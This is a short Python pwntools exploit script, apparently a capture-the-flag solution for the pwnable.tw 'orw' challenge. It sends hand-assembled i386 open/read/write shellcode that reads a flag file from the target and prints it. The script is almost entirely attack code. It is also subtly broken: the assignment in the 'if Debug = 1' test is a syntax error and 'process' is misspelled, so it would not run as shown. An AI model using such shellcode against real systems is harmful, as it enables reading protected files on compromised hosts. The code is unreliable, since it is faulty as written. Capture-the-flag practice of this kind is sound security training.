from pwn import *

Debug = 1
context(arch = "i386",os = "linux",log_level = "debug")


if Debug = 1:
    p = proccess("./orw")
    gdb.attach(p)
else:
    p = remote("chall.pwnable.tw", 10001)

shellcode = ''

shellcode += asm('xor ecx,ecx;\
                  mov eax,0x5; \
                  push ecx;\
                  push 0x67616c66; \
                  push 0x2f77726f; \
                  push 0x2f656d6f; \
                  push 0x682f2f2f; \
                  mov ebx,esp;\
                  xor edx,edx;\
                  int 0x80;')

shellcode += asm('mov eax,0x3;\
                  mov ecx,ebx;\
                  mov ebx,0x3;\
                  mov dl,0x30;\
                  int 0x80;')

shellcode += asm('mov eax,0x4;\
                  mov bl,0x1;\
                  int 0x80;')   

def pwn():
    recv = p.recvuntil(':')
    print recv
    p.sendline(shellcode)
    p.recv()
pwn()